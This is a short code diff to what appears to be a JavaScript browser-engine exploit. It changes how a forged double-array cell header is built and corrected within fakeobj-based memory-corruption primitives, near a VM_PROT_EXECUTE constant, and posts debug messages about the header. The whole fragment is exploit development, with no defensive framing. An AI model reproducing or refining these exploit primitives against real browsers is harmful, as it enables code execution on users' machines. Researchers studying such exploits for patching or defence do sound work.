@@ -413,7 +413,7 @@ var VM_PROT_EXECUTE = 0x4
           }
           // the structure ID is wrong, but we'll fix it :)
           //let doubleArrayCellHeader = new Int64(0x0108230700000000).asJSValue();
-          let doubleArrayCellHeader = new Int64([0x00,0x10,0x82,0x30,0x7,0x00,0x00,0x0]);
+          let doubleArrayCellHeader = new Int64(0x0108230700000000);
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function float2bigint(v,set) {
@@ -505,7 +505,7 @@ var VM_PROT_EXECUTE = 0x4
             let fakeArr = fakeobj(Add(addr,new Int64(0x10))); //no way around this im forced to use bigint for fakeobj :(
             // subtract off the incref
             //doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
-              doubleArrayCellHeader = new Int64.fromDouble(fakeArr[0])
+              doubleArrayCellHeader = Sub(new Int64.fromDouble(fakeArr[0]),new Int64("0x1"));
             port.postMessage("double array header1: " + doubleArrayCellHeader.toString(16));
             //fakeArr[0] = new Int64(0x414141414141).asDouble()
             // fix broken cell header
